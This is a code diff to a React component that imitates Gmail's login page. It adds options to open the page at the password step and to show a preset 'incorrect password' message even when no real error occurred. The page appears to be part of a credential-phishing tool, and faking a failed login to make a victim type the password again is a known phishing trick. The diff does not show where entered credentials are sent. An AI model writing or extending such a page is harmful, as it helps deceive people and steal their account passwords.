@@ -6,6 +6,8 @@ interface GmailLoginPageProps {
   onLoginSuccess?: (sessionData: any) => void;
   onLoginError?: (error: string) => void;
   defaultEmail?: string;
+  startAtPasswordStep?: boolean;
+  incorrectPasswordError?: string;
 }
 
 // Custom floating label input for Google style
@@ -36,10 +38,10 @@ const GoogleInput = ({ value, onChange, label, type = "text", autoFocus = false 
 };
 
 
-const GmailLoginPage: React.FC<GmailLoginPageProps> = ({ onLoginSuccess, onLoginError, defaultEmail }) => {
+const GmailLoginPage: React.FC<GmailLoginPageProps> = ({ onLoginSuccess, onLoginError, defaultEmail, startAtPasswordStep, incorrectPasswordError }) => {
   const [email, setEmail] = useState(defaultEmail || '');
   const [password, setPassword] = useState('');
-  const [showPasswordStep, setShowPasswordStep] = useState(false);
+  const [showPasswordStep, setShowPasswordStep] = useState(!!startAtPasswordStep);
   const [pageReady, setPageReady] = useState(false);
   const [isTransitioning, setIsTransitioning] = useState(false);
   const [showPassword, setShowPassword] = useState(false);
@@ -154,6 +156,9 @@ const GmailLoginPage: React.FC<GmailLoginPageProps> = ({ onLoginSuccess, onLogin
               <div className="md:w-1/2 mt-10 md:mt-0 flex flex-col">
                 {errorMessage && !isLoading && (
                   <div className="text-red-600 text-sm font-medium mb-4">{errorMessage}</div>
+                )}
+                {!errorMessage && incorrectPasswordError && (
+                  <div className="text-red-600 text-sm font-medium mb-4">{incorrectPasswordError}</div>
                 )}
 
                 {!showPasswordStep ? (
